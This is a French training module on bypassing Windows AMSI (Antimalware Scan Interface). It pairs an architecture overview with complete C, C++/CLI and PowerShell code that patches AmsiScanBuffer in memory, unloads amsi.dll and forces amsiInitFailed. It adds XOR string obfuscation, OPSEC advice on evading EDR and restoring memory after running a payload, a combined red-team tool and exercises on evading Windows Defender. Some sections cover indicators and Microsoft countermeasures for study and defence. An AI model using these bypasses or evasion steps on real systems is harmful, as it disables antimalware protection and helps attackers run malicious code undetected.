# Cours W36 : AMSI Bypass - Contourner Antimalware Scan Interface

## 1. Objectifs du Module

A la fin de ce module, vous serez capable de :

- Comprendre l'architecture et le fonctionnement d'AMSI (Antimalware Scan Interface)
- Identifier les points d'interception AMSI dans le système Windows
- Implémenter différentes techniques de bypass AMSI en C
- Analyser l'impact d'AMSI sur PowerShell, .NET, VBScript et JScript
- Appliquer des mesures OPSEC pour éviter la détection lors du bypass
- Reconnaître les limitations et les contre-mesures des techniques de bypass

**Prérequis** : Modules W01-W35, connaissance de PowerShell, compréhension des hooks système

**Niveau** : Intermédiaire à Avancé

**Durée estimée** : 6-8 heures

---

## 2. Introduction à AMSI

### 2.1. Qu'est-ce qu'AMSI ?

**AMSI (Antimalware Scan Interface)** est une interface introduite par Microsoft dans Windows 10 qui permet aux applications et services d'intégrer n'importe quel produit antimalware présent sur la machine.

**Analogie** : Imaginez AMSI comme un point de contrôle de sécurité à l'entrée d'un bâtiment. Chaque fois qu'un script ou du code veut "entrer" (s'exécuter), il doit passer par ce point de contrôle où un agent de sécurité (l'antivirus) l'inspecte. Si le contenu est suspect, l'accès est refusé.

### 2.2. Pourquoi AMSI existe-t-il ?

Avant AMSI, les antivirus avaient du mal à analyser :
- Les scripts PowerShell exécutés en mémoire
- Le code .NET chargé dynamiquement
- Les macros VBA et scripts VBScript/JScript
- Le contenu désobfusqué après déchiffrement

**Problème historique** :
```ascii
Avant AMSI (2015) :
┌─────────────────┐
│  Script chiffré │ → Antivirus : ✓ OK (contenu illisible)
└─────────────────┘
         ↓
┌─────────────────┐
│  Déchiffrement  │ → En mémoire, invisible pour l'AV
└─────────────────┘
         ↓
┌─────────────────┐
│  Code malveillant│ → Exécuté sans détection !
│    s'exécute    │
└─────────────────┘
```

**Avec AMSI** :
```ascii
Après AMSI (2015+) :
┌─────────────────┐
│  Script chiffré │ → Antivirus : ✓ OK
└─────────────────┘
         ↓
┌─────────────────┐
│  Déchiffrement  │
└─────────────────┘
         ↓
┌─────────────────┐
│ POINT AMSI      │ → Scan du contenu déchiffré
│ Inspection ici! │ → Antivirus : ✗ BLOQUÉ
└─────────────────┘
```

### 2.3. Applications concernées

AMSI est intégré dans :
- **PowerShell** (versions 5.0+)
- **.NET Framework 4.8+**
- **VBScript/JScript** (via Windows Script Host)
- **Office VBA Macros**
- **Applications tierces** qui implémentent l'API AMSI

---

## 3. Architecture AMSI

### 3.1. Composants principaux

```ascii
┌──────────────────────────────────────────────────────────┐
│                    APPLICATION                            │
│  (PowerShell, .NET, VBScript, Application personnalisée) │
└───────────────────────┬──────────────────────────────────┘
                        │
                        │ Appels API AMSI
                        ↓
┌──────────────────────────────────────────────────────────┐
│                      AMSI.DLL                             │
│ ┌──────────────────────────────────────────────────────┐ │
│ │  AmsiInitialize()                                    │ │
│ │  AmsiOpenSession()                                   │ │
│ │  AmsiScanBuffer() ← Point critique pour bypass      │ │
│ │  AmsiScanString() ← Point critique pour bypass      │ │
│ │  AmsiCloseSession()                                  │ │
│ │  AmsiUninitialize()                                  │ │
│ └──────────────────────────────────────────────────────┘ │
└───────────────────────┬──────────────────────────────────┘
                        │
                        │ Transmission du contenu
                        ↓
┌──────────────────────────────────────────────────────────┐
│              AMSI PROVIDER (Antivirus)                    │
│  Windows Defender, Kaspersky, McAfee, etc.               │
│                                                           │
│  Analyse le contenu → Retourne le verdict                │
└──────────────────────────────────────────────────────────┘
```

### 3.2. Flux d'exécution détaillé

```ascii
Exécution d'un script PowerShell :

1. PowerShell.exe démarre
   │
   ├──> Charge amsi.dll (LoadLibrary)
   │
2. AmsiInitialize()
   │
   └──> Initialise le contexte AMSI

3. AmsiOpenSession()
   │
   └──> Ouvre une session de scan

4. Script exécuté ligne par ligne
   │
   ├──> Pour chaque bloc de code :
   │    │
   │    ├──> AmsiScanBuffer(context, buffer, length, contentName, session, &result)
   │    │         │
   │    │         └──> Transmet à Windows Defender
   │    │                   │
   │    │                   ├──> Signatures malware ?
   │    │                   ├──> Heuristiques ?
   │    │                   ├──> Analyse comportementale ?
   │    │                   │
   │    │                   └──> Retourne AMSI_RESULT
   │    │
   │    └──> Si AMSI_RESULT_DETECTED → BLOCAGE
   │         Si AMSI_RESULT_CLEAN → EXÉCUTION
   │
5. AmsiCloseSession()
   │
6. AmsiUninitialize()
```

### 3.3. Fonctions critiques d'AMSI

#### AmsiScanBuffer

```c
HRESULT AmsiScanBuffer(
  HAMSICONTEXT amsiContext,      // Contexte AMSI initialisé
  PVOID        buffer,            // Pointeur vers le contenu à scanner
  ULONG        length,            // Taille du contenu
  LPCWSTR      contentName,       // Nom du contenu (pour logs)
  HAMSISESSION amsiSession,       // Session AMSI
  AMSI_RESULT  *result            // Résultat du scan (OUT)
);
```

**Valeurs de retour possibles (AMSI_RESULT)** :
- `AMSI_RESULT_CLEAN` (0) : Contenu bénin
- `AMSI_RESULT_NOT_DETECTED` (1) : Pas de malware détecté
- `AMSI_RESULT_BLOCKED_BY_ADMIN_START` (16384) : Bloqué par politique
- `AMSI_RESULT_BLOCKED_BY_ADMIN_END` (20479) : Bloqué par politique
- `AMSI_RESULT_DETECTED` (32768) : Malware détecté

#### AmsiScanString

```c
HRESULT AmsiScanString(
  HAMSICONTEXT amsiContext,
  LPCWSTR      string,            // Chaîne à scanner (Unicode)
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result
);
```

### 3.4. Points d'interception AMSI

```ascii
PowerShell Pipeline :

┌─────────────────────────────────────────────────────────┐
│  Utilisateur tape : Invoke-Mimikatz                     │
└────────────────────┬────────────────────────────────────┘
                     │
                     ↓
              ┌──────────────┐
              │ Parse        │
              └──────┬───────┘
                     │
                     ↓ SCAN AMSI #1 (commande brute)
              ┌──────────────┐
              │ Compile      │
              └──────┬───────┘
                     │
                     ↓ SCAN AMSI #2 (après désobfuscation)
              ┌──────────────┐
              │ Execute      │
              └──────┬───────┘
                     │
                     ↓ SCAN AMSI #3 (contenu chargé dynamiquement)
              ┌──────────────┐
              │ Output       │
              └──────────────┘
```

---

## 4. Techniques de Bypass AMSI

### 4.1. Technique #1 : Patching AmsiScanBuffer (Memory Patching)

**Principe** : Modifier le code assembleur de la fonction `AmsiScanBuffer` en mémoire pour qu'elle retourne toujours `AMSI_RESULT_CLEAN`.

**Analogie** : C'est comme remplacer l'agent de sécurité au point de contrôle par un panneau "Entrée libre". Tout le monde passe sans être inspecté.

#### Code C complet

```c
#include <windows.h>
#include <stdio.h>

/*
 * Technique : Patch AmsiScanBuffer pour retourner E_INVALIDARG (0x80070057)
 *
 * Assembleur original (x64) :
 *   4C 8B DC          mov r11, rsp
 *   49 89 5B 08       mov [r11+8], rbx
 *   ...
 *
 * Patch appliqué (x64) :
 *   B8 57 00 07 80    mov eax, 0x80070057  (E_INVALIDARG)
 *   C3                ret
 *
 * Résultat : AMSI considère tous les scans comme invalides et les ignore
 */

BOOL PatchAmsiScanBuffer() {
    HMODULE hAmsi = NULL;
    LPVOID amsiScanBuffer = NULL;
    DWORD oldProtect = 0;

    // 1. Charger amsi.dll si pas déjà chargée
    hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        printf("[!] Erreur : Impossible de charger amsi.dll (code %lu)\n", GetLastError());
        return FALSE;
    }
    printf("[+] amsi.dll chargee a l'adresse : 0x%p\n", hAmsi);

    // 2. Obtenir l'adresse de AmsiScanBuffer
    amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (amsiScanBuffer == NULL) {
        printf("[!] Erreur : Impossible de trouver AmsiScanBuffer (code %lu)\n", GetLastError());
        return FALSE;
    }
    printf("[+] AmsiScanBuffer trouvee a l'adresse : 0x%p\n", amsiScanBuffer);

    // 3. Changer les permissions mémoire (RWX)
    if (!VirtualProtect(amsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] Erreur : VirtualProtect a echoue (code %lu)\n", GetLastError());
        return FALSE;
    }
    printf("[+] Permissions memoire modifiees (oldProtect: 0x%lx)\n", oldProtect);

    // 4. Écrire le patch (architecture x64)
    #ifdef _WIN64
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
        0xC3                            // ret
    };
    #else
    // Architecture x86 (32-bit)
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
        0xC2, 0x18, 0x00                // ret 0x18
    };
    #endif

    memcpy(amsiScanBuffer, patch, sizeof(patch));
    printf("[+] Patch applique : AmsiScanBuffer patche avec succes\n");

    // 5. Restaurer les permissions originales (OPSEC)
    VirtualProtect(amsiScanBuffer, 8, oldProtect, &oldProtect);
    printf("[+] Permissions memoire restaurees\n");

    return TRUE;
}

int main() {
    printf("=== AMSI Bypass - Technique #1 : AmsiScanBuffer Patching ===\n\n");

    if (PatchAmsiScanBuffer()) {
        printf("\n[SUCCESS] AMSI est maintenant bypasse !\n");
        printf("[*] PowerShell peut maintenant executer des scripts sans detection AMSI\n");
    } else {
        printf("\n[FAILED] Le bypass AMSI a echoue\n");
        return 1;
    }

    return 0;
}
```

**Compilation** :
```bash
# x64
cl.exe /Fe:amsi_bypass_patch.exe amsi_bypass_patch.c

# Ou avec gcc (MinGW)
gcc -o amsi_bypass_patch.exe amsi_bypass_patch.c
```

**Explication détaillée du patch** :

```ascii
Avant le patch (bytes originaux de AmsiScanBuffer) :
Adresse     Bytes                 Assembleur
0x00        4C 8B DC             mov r11, rsp
0x03        49 89 5B 08          mov [r11+8], rbx
0x07        49 89 6B 10          mov [r11+0x10], rbp
...         ...                  ... (code légitime)

Après le patch :
Adresse     Bytes                 Assembleur
0x00        B8 57 00 07 80       mov eax, 0x80070057  ← NOTRE PATCH
0x05        C3                   ret                  ← NOTRE PATCH
0x06        (bytes non exécutés car ret déjà effectué)

Résultat : La fonction retourne immédiatement E_INVALIDARG
          sans exécuter le scan AMSI
```

#### Limitations

- **Détection** : EDR modernes surveillent `VirtualProtect` sur `amsi.dll`
- **Protection** : Windows Defender peut protéger `amsi.dll` en mémoire
- **Signature** : Le pattern de patch est connu et détecté

---

### 4.2. Technique #2 : Corruption du contexte AMSI (AmsiContext)

**Principe** : Corrompre la structure `HAMSICONTEXT` pour invalider toutes les opérations AMSI.

**Analogie** : Au lieu de remplacer l'agent de sécurité, on détruit son badge d'identification. Sans badge valide, il ne peut plus exercer son autorité.

#### Code C complet

```c
#include <windows.h>
#include <stdio.h>

/*
 * Technique : Corrompre le contexte AMSI
 *
 * Structure interne AMSI (non documentée) :
 * typedef struct {
 *     DWORD Signature;     // Offset 0x00 : "AMSI" (0x49534D41)
 *     ...
 * } HAMSICONTEXT_INTERNAL;
 *
 * En corrompant la signature, AMSI devient inopérant
 */

BOOL CorruptAmsiContext() {
    HMODULE hAmsi = NULL;
    LPVOID amsiContext = NULL;
    DWORD oldProtect = 0;

    // 1. Charger amsi.dll
    hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) {
        printf("[!] Erreur : Impossible de charger amsi.dll\n");
        return FALSE;
    }

    // 2. Trouver AmsiScanBuffer (pour localiser le contexte utilisé)
    LPVOID amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (amsiScanBuffer == NULL) {
        printf("[!] Erreur : Impossible de trouver AmsiScanBuffer\n");
        return FALSE;
    }

    // 3. Cette technique nécessite d'analyser les structures internes
    //    Pour simplifier, on cible directement l'offset connu

    // Note : Dans un vrai scénario, il faudrait :
    // - Analyser la mémoire du processus PowerShell
    // - Localiser la structure HAMSICONTEXT active
    // - Corrompre le champ "Signature" à l'offset 0x00

    printf("[+] Technique de corruption de contexte (avancee)\n");
    printf("[!] Cette technique necessite l'analyse dynamique du processus cible\n");
    printf("[*] Voir la technique PowerShell ci-dessous pour implementation pratique\n");

    return TRUE;
}

int main() {
    printf("=== AMSI Bypass - Technique #2 : AmsiContext Corruption ===\n\n");

    CorruptAmsiContext();

    return 0;
}
```

**Version PowerShell (plus pratique pour cette technique)** :

```powershell
# Corruption du contexte AMSI via PowerShell
$amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsiField = $amsiContext.GetField('amsiContext', 'NonPublic,Static')

# Corrompre le contexte en le mettant à null
$amsiField.SetValue($null, $null)

Write-Host "[+] AmsiContext corrompu avec succes" -ForegroundColor Green
```

#### Variante : Forcer amsiInitFailed

```c
#include <windows.h>
#include <stdio.h>

BOOL ForceAmsiInitFailed() {
    HMODULE hAmsi = NULL;
    LPVOID amsiInitFailedAddr = NULL;
    DWORD oldProtect = 0;

    hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) return FALSE;

    // Dans certaines versions, AMSI utilise un flag "amsiInitFailed"
    // Si ce flag est à TRUE, AMSI est désactivé

    // Cette adresse varie selon la version de Windows
    // Il faut analyser amsi.dll avec un désassembleur (IDA, Ghidra)

    printf("[!] Cette technique necessite l'analyse statique d'amsi.dll\n");
    printf("[*] Rechercher la variable globale 'amsiInitFailed'\n");

    // Exemple conceptuel :
    // amsiInitFailedAddr = (LPVOID)((BYTE*)hAmsi + OFFSET_AMSI_INIT_FAILED);
    // VirtualProtect(amsiInitFailedAddr, 1, PAGE_READWRITE, &oldProtect);
    // *(BYTE*)amsiInitFailedAddr = 1;  // Forcer à TRUE
    // VirtualProtect(amsiInitFailedAddr, 1, oldProtect, &oldProtect);

    return TRUE;
}
```

---

### 4.3. Technique #3 : DLL Unhooking / Unloading

**Principe** : Décharger `amsi.dll` de la mémoire du processus pour supprimer complètement l'interface AMSI.

**Analogie** : Si vous ne pouvez pas tromper l'agent de sécurité, enlevez carrément le point de contrôle !

#### Code C complet

```c
#include <windows.h>
#include <stdio.h>

/*
 * Technique : Décharger amsi.dll du processus
 *
 * Attention : Cette technique peut causer des crashs si des références
 * à amsi.dll existent encore dans le processus
 */

BOOL UnloadAmsiDll() {
    HMODULE hAmsi = NULL;

    // 1. Obtenir le handle de amsi.dll si déjà chargée
    hAmsi = GetModuleHandleA("amsi.dll");
    if (hAmsi == NULL) {
        printf("[*] amsi.dll n'est pas chargee dans ce processus\n");
        return TRUE;  // Déjà déchargée, mission accomplie
    }

    printf("[+] amsi.dll trouvee a l'adresse : 0x%p\n", hAmsi);

    // 2. Décharger amsi.dll
    // Note : Il faut appeler FreeLibrary autant de fois que LoadLibrary a été appelé
    BOOL success = FALSE;
    int attempts = 0;

    while (GetModuleHandleA("amsi.dll") != NULL && attempts < 100) {
        success = FreeLibrary(hAmsi);
        if (!success) {
            printf("[!] FreeLibrary a echoue (tentative %d, code %lu)\n",
                   attempts + 1, GetLastError());
            break;
        }
        attempts++;
    }

    if (GetModuleHandleA("amsi.dll") == NULL) {
        printf("[+] amsi.dll dechargee avec succes apres %d tentatives\n", attempts);
        return TRUE;
    } else {
        printf("[!] Impossible de decharger completement amsi.dll\n");
        return FALSE;
    }
}

int main() {
    printf("=== AMSI Bypass - Technique #3 : DLL Unloading ===\n\n");

    if (UnloadAmsiDll()) {
        printf("\n[SUCCESS] AMSI a ete decharge !\n");
        printf("[*] Le processus actuel n'a plus d'interface AMSI\n");
    } else {
        printf("\n[FAILED] Le dechargement d'AMSI a echoue\n");
    }

    return 0;
}
```

**Limitations** :
- PowerShell peut recharger `amsi.dll` automatiquement
- Peut causer des crashs si des callbacks AMSI sont enregistrés
- Très visible pour les EDR (déchargement d'une DLL système)

---

### 4.4. Technique #4 : Reflection / CLR Tampering (.NET)

**Principe** : Utiliser la réflexion .NET pour modifier les objets internes de PowerShell liés à AMSI.

**Code PowerShell** :

```powershell
# Technique classique de bypass AMSI via Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Version C avec C++/CLI** :

```c
// Nécessite compilation en C++/CLI (pas en C pur)
#include <windows.h>
#using <mscorlib.dll>
#using <System.dll>

using namespace System;
using namespace System::Reflection;

void BypassAmsiReflection() {
    try {
        // Obtenir le type AmsiUtils
        Assembly^ assembly = Assembly::GetAssembly(Type::GetType("System.Management.Automation.PSObject"));
        Type^ amsiUtils = assembly->GetType("System.Management.Automation.AmsiUtils");

        // Obtenir le champ amsiInitFailed
        FieldInfo^ amsiInitFailed = amsiUtils->GetField("amsiInitFailed",
            BindingFlags::NonPublic | BindingFlags::Static);

        // Forcer à true
        amsiInitFailed->SetValue(nullptr, true);

        Console::WriteLine("[+] AMSI bypasse via Reflection");
    }
    catch (Exception^ e) {
        Console::WriteLine("[!] Erreur : " + e->Message);
    }
}
```

---

### 4.5. Technique #5 : Obfuscation de chaîne

**Principe** : Au lieu de bypasser AMSI, éviter sa détection en obfusquant les signatures malveillantes.

**Code C - Générateur d'obfuscation** :

```c
#include <stdio.h>
#include <string.h>

/*
 * Technique : Obfusquer les chaînes sensibles pour éviter la détection AMSI
 *
 * AMSI scanne les chaînes comme "Invoke-Mimikatz", "AmsiScanBuffer", etc.
 * En les obfusquant, on peut éviter la détection par signatures
 */

void PrintObfuscated(const char* str) {
    printf("[+] Chaine originale : %s\n", str);
    printf("[+] Version XOR (cle 0x42) : ");

    for (int i = 0; i < strlen(str); i++) {
        printf("0x%02X,", str[i] ^ 0x42);
    }
    printf("\n");
}

// Désobfuscation à l'exécution
void DeobfuscateAndExecute(unsigned char* obfuscated, int len) {
    char* deobfuscated = (char*)malloc(len + 1);

    for (int i = 0; i < len; i++) {
        deobfuscated[i] = obfuscated[i] ^ 0x42;
    }
    deobfuscated[len] = '\0';

    printf("[+] Chaine desobfusquee : %s\n", deobfuscated);

    // Ici, utiliser la chaîne désobfusquée pour charger une fonction
    // Exemple : LoadLibraryA(deobfuscated);

    free(deobfuscated);
}

int main() {
    printf("=== AMSI Bypass - Technique #5 : String Obfuscation ===\n\n");

    // Obfusquer des chaînes sensibles
    PrintObfuscated("amsi.dll");
    PrintObfuscated("AmsiScanBuffer");
    PrintObfuscated("Invoke-Mimikatz");

    // Exemple de désobfuscation
    unsigned char obfuscated[] = {0x21,0x2D,0x2B,0x2C,0x00,0x26,0x2E,0x2E};
    printf("\n");
    DeobfuscateAndExecute(obfuscated, 8);

    return 0;
}
```

---

## 5. Impact sur PowerShell, .NET, VBScript

### 5.1. PowerShell

**Points d'interception AMSI dans PowerShell** :

```ascii
PowerShell Execution Flow :

┌────────────────────────────────────────┐
│ Commande tapée par l'utilisateur       │
└────────┬───────────────────────────────┘
         │
         ↓ SCAN #1 : Commande brute
┌────────────────────────────────────────┐
│ ScriptBlock Logging                    │
└────────┬───────────────────────────────┘
         │
         ↓ SCAN #2 : ScriptBlock compilé
┌────────────────────────────────────────┐
│ Dynamic Code (IEX, Invoke-Expression)  │
└────────┬───────────────────────────────┘
         │
         ↓ SCAN #3 : Code dynamique
┌────────────────────────────────────────┐
│ Exécution finale                       │
└────────────────────────────────────────┘
```

**Test de bypass sur PowerShell** :

```powershell
# Avant le bypass
PS> 'Invoke-Mimikatz'
# AMSI détecte et bloque

# Après le bypass (avec notre programme C)
PS> .\amsi_bypass_patch.exe
PS> 'Invoke-Mimikatz'
# Pas de blocage AMSI
```

### 5.2. .NET Framework

AMSI est intégré dans :
- `System.Management.Automation` (PowerShell)
- CLR (Common Language Runtime) pour le code chargé dynamiquement

**Exemple de détection .NET** :

```csharp
// Ce code déclencherait AMSI
Assembly.Load(maliciousBytes); // ← AMSI scanne maliciousBytes
```

### 5.3. VBScript et JScript

Depuis Windows 10, VBScript et JScript passent par AMSI :

```vbscript
' VBScript avec AMSI
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -enc <base64>"  ' ← AMSI scanne le contenu
```

**Impact du bypass** : Une fois AMSI bypassé dans le processus, tous les scripts VBS/JS exécutés dans ce processus ne seront plus scannés.

---

## 6. Détection et OPSEC

### 6.1. Indicateurs de compromission (IOC)

**Ce que les EDR surveillent** :

```ascii
Détection potentielle :

1. Modifications mémoire suspectes
   ┌──────────────────────────────────────┐
   │ VirtualProtect() sur amsi.dll        │ ← ALERTE HAUTE
   │ WriteProcessMemory() sur amsi.dll    │ ← ALERTE HAUTE
   └──────────────────────────────────────┘

2. Manipulations de DLL système
   ┌──────────────────────────────────────┐
   │ FreeLibrary(amsi.dll)                │ ← ALERTE MOYENNE
   │ GetProcAddress("AmsiScanBuffer")     │ ← ALERTE BASSE
   └──────────────────────────────────────┘

3. Patterns de code connus
   ┌──────────────────────────────────────┐
   │ Bytes : B8 57 00 07 80 C3           │ ← SIGNATURE CONNUE
   │ String : "amsiInitFailed"            │ ← SIGNATURE CONNUE
   └──────────────────────────────────────┘
```

### 6.2. Techniques OPSEC

**1. Indirect Syscalls**

Au lieu de `VirtualProtect`, utiliser des syscalls directs :

```c
// Syscall direct (plus furtif)
NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);
```

**2. Timing**

Appliquer le bypass juste avant l'exécution malveillante, pas au démarrage :

```c
// Mauvais (détectable)
int main() {
    PatchAmsiScanBuffer();  // ← Patch dès le début
    // ... 10 minutes plus tard
    ExecuteMaliciousPayload();
}

// Mieux (OPSEC)
int main() {
    // ... code légitime
    PreparePayload();
    PatchAmsiScanBuffer();  // ← Patch juste avant
    ExecuteMaliciousPayload();
    RestoreAmsiScanBuffer(); // ← Restaurer après !
}
```

**3. Restauration après usage**

```c
BOOL RestoreAmsiScanBuffer(unsigned char* originalBytes, size_t size) {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    LPVOID amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    DWORD oldProtect;

    VirtualProtect(amsiScanBuffer, size, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(amsiScanBuffer, originalBytes, size);
    VirtualProtect(amsiScanBuffer, size, oldProtect, &oldProtect);

    return TRUE;
}
```

**4. Éviter les chaînes hardcodées**

```c
// Mauvais
LoadLibraryA("amsi.dll");

// Mieux
char dll[] = {'a','m','s','i','.','d','l','l',0};
LoadLibraryA(dll);

// Encore mieux (obfusqué)
unsigned char dll_enc[] = {0x21,0x2D,0x2B,0x2C,0x00,0x26,0x2E,0x2E};
char dll[9];
for(int i=0; i<8; i++) dll[i] = dll_enc[i] ^ 0x42;
dll[8] = 0;
LoadLibraryA(dll);
```

### 6.3. Contre-mesures Microsoft

Microsoft implémente plusieurs protections :

1. **Protected Processes** : `amsi.dll` peut être chargée dans un processus protégé
2. **Kernel Callbacks** : ETW (Event Tracing for Windows) log les modifications d'`amsi.dll`
3. **Signatures comportementales** : Windows Defender détecte les patterns de bypass
4. **Memory Integrity** : HVCI (Hypervisor-protected Code Integrity) peut bloquer les modifications

---

## 7. Exemple complet : Programme C avec tous les bypass

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

// Prototypes
BOOL PatchAmsiScanBuffer();
BOOL UnloadAmsiDll();
void TestBypass();

// Stockage des bytes originaux pour restauration
unsigned char originalBytes[8];
BOOL backupDone = FALSE;

BOOL PatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[!] Impossible de charger amsi.dll\n");
        return FALSE;
    }

    LPVOID amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!amsiScanBuffer) {
        printf("[!] Impossible de trouver AmsiScanBuffer\n");
        return FALSE;
    }

    // Backup des bytes originaux
    if (!backupDone) {
        memcpy(originalBytes, amsiScanBuffer, 8);
        backupDone = TRUE;
    }

    DWORD oldProtect;
    if (!VirtualProtect(amsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtect a echoue\n");
        return FALSE;
    }

    #ifdef _WIN64
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    #else
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00};
    #endif

    memcpy(amsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(amsiScanBuffer, 8, oldProtect, &oldProtect);

    printf("[+] AmsiScanBuffer patche avec succes\n");
    return TRUE;
}

BOOL RestoreAmsiScanBuffer() {
    if (!backupDone) {
        printf("[!] Aucun backup disponible\n");
        return FALSE;
    }

    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) return FALSE;

    LPVOID amsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!amsiScanBuffer) return FALSE;

    DWORD oldProtect;
    VirtualProtect(amsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(amsiScanBuffer, originalBytes, 8);
    VirtualProtect(amsiScanBuffer, 8, oldProtect, &oldProtect);

    printf("[+] AmsiScanBuffer restaure\n");
    return TRUE;
}

void TestBypass() {
    printf("\n=== Test du bypass ===\n");
    printf("[*] Lancer PowerShell et tester :\n");
    printf("    PS> 'Invoke-Mimikatz'\n");
    printf("    PS> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'\n");
    printf("\n[*] Si aucune erreur AMSI n'apparait, le bypass fonctionne !\n");
}

int main(int argc, char* argv[]) {
    printf("╔════════════════════════════════════════════════════════╗\n");
    printf("║        AMSI Bypass - Red Team Tool                    ║\n");
    printf("║        Usage educatif uniquement                      ║\n");
    printf("╚════════════════════════════════════════════════════════╝\n\n");

    if (argc > 1 && strcmp(argv[1], "--patch") == 0) {
        printf("[*] Mode : Patch AmsiScanBuffer\n");
        if (PatchAmsiScanBuffer()) {
            TestBypass();
            printf("\n[*] Appuyez sur une touche pour restaurer AMSI...\n");
            getchar();
            RestoreAmsiScanBuffer();
        }
    } else if (argc > 1 && strcmp(argv[1], "--unload") == 0) {
        printf("[*] Mode : Unload amsi.dll\n");
        UnloadAmsiDll();
    } else {
        printf("Usage :\n");
        printf("  %s --patch    : Patcher AmsiScanBuffer\n", argv[0]);
        printf("  %s --unload   : Decharger amsi.dll\n", argv[0]);
    }

    return 0;
}
```

**Compilation** :
```bash
# Windows x64
cl.exe /Fe:amsi_bypass.exe amsi_bypass.c /link /SUBSYSTEM:CONSOLE

# MinGW
gcc -o amsi_bypass.exe amsi_bypass.c -municode
```

**Utilisation** :
```bash
# Patcher AMSI
amsi_bypass.exe --patch

# Dans un autre terminal, tester avec PowerShell
powershell.exe
PS> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
# Normalement, cette chaîne déclenche AMSI. Si pas de blocage = bypass OK
```

---

## 8. Checklist de sécurité offensive

### Phase de reconnaissance

- [ ] Identifier la version de Windows cible
- [ ] Vérifier si AMSI est activé (PowerShell 5.0+)
- [ ] Lister les providers AMSI installés (Windows Defender, autres AV)
- [ ] Analyser les protections EDR en place

### Phase de développement

- [ ] Choisir la technique de bypass adaptée au contexte
- [ ] Implémenter l'obfuscation des chaînes sensibles
- [ ] Tester sur une VM isolée (Windows 10/11 à jour)
- [ ] Vérifier que le bypass fonctionne avec PowerShell
- [ ] Implémenter la restauration post-exploitation (OPSEC)

### Phase de test

- [ ] Tester avec Windows Defender activé
- [ ] Tester avec ScriptBlock Logging activé
- [ ] Vérifier les logs ETW (Event Tracing for Windows)
- [ ] Analyser les alertes EDR potentielles
- [ ] Tester la persistance du bypass

### Phase opérationnelle

- [ ] Appliquer le bypass juste avant l'action malveillante
- [ ] Minimiser le temps entre bypass et exécution
- [ ] Restaurer AMSI après usage si possible
- [ ] Nettoyer les artefacts (logs, fichiers temporaires)
- [ ] Documenter les IOC pour blue team (si exercice)

---

## 9. Exercices pratiques

### Exercice 1 : Bypass basique (Débutant)

**Objectif** : Implémenter un bypass AMSI simple en C

**Tâches** :
1. Compiler le code de la technique #1 (PatchAmsiScanBuffer)
2. Exécuter le programme sur Windows 10
3. Tester avec PowerShell : `'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'`
4. Vérifier que la chaîne ne déclenche plus de blocage AMSI

**Critères de réussite** :
- Le programme compile sans erreur
- AmsiScanBuffer est patché avec succès
- PowerShell n'affiche plus d'erreur AMSI sur la chaîne de test

---

### Exercice 2 : Bypass avec obfuscation (Intermédiaire)

**Objectif** : Rendre le bypass moins détectable

**Tâches** :
1. Modifier le code pour obfusquer les chaînes "amsi.dll" et "AmsiScanBuffer"
2. Implémenter un déchiffrement XOR à l'exécution
3. Tester la détection avec Windows Defender
4. Comparer les détections avant/après obfuscation

**Critères de réussite** :
- Aucune chaîne sensible en clair dans l'exécutable
- Windows Defender ne détecte pas l'exécutable (test sur VM isolée)
- Le bypass fonctionne toujours

---

### Exercice 3 : Bypass avec restauration (Avancé)

**Objectif** : Implémenter un bypass OPSEC-friendly

**Tâches** :
1. Sauvegarder les bytes originaux d'AmsiScanBuffer avant patch
2. Implémenter une fonction de restauration
3. Créer un workflow : patch → exécution → restauration
4. Mesurer le temps entre patch et restauration (doit être < 1 seconde)

**Critères de réussite** :
- AMSI est restauré après usage
- Le temps de bypass est minimal
- Aucun crash lors de la restauration

---

### Exercice 4 : Analyse forensique (Expert)

**Objectif** : Comprendre la détection du bypass

**Tâches** :
1. Activer ETW (Event Tracing) pour surveiller amsi.dll
2. Exécuter votre bypass
3. Analyser les événements générés
4. Identifier les IOC (Indicators of Compromise)
5. Proposer des améliorations pour réduire la détectabilité

**Outils** :
- Process Monitor (Sysinternals)
- ETW Explorer
- WinDbg pour analyser amsi.dll en mémoire

**Critères de réussite** :
- Liste complète des événements générés
- Identification d'au moins 3 IOC
- Proposition de 2 techniques d'atténuation

---

## 10. Ressources complémentaires

### Documentation officielle

- [Microsoft AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
